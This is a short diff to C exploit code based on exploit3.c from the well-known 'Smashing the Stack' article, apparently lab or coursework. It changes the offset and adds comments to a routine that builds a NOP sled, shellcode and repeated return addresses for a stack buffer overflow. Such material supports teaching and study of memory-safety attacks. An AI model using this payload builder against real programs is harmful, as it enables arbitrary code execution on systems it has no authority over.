@@ -1,10 +1,11 @@
 /*
 *  Aleph's shellcode
+*  Based on exploit3.c from http://insecure.org/stf/smashstack.html
 */
 
 #include <stdlib.h>
 
-#define DEFAULT_OFFSET                 464
+#define DEFAULT_OFFSET                 -288
 #define DEFAULT_BUFFER_SIZE            300
 #define NOP                            0x90
 
@@ -31,22 +32,25 @@ void main(int argc, char *argv[]) {
     exit(0);
   }
 
-  addr = get_sp() - offset;
+  addr = get_sp() - offset; //get our address to use
   // printf("Using address: 0x%x\n", addr);
 
   ptr = buff;
   addr_ptr = (long *) ptr;
+  //first fill the buffer with the address
   for (i = 0; i < bsize; i+=4)
     *(addr_ptr++) = addr;
 
+  //fill the first half of the buffer with NOP
   for (i = 0; i < bsize/2; i++)
     buff[i] = NOP;
 
+  //stick your shellcode in the tasty center, a sandwich of NOP[shl]ADDR
   ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
   for (i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];
 
-  buff[bsize - 1] = '\0';
+  buff[bsize - 1] = '\0'; //null terminate your string!
 
   printf(buff);
   // memcpy(buff,"EGG=",4);
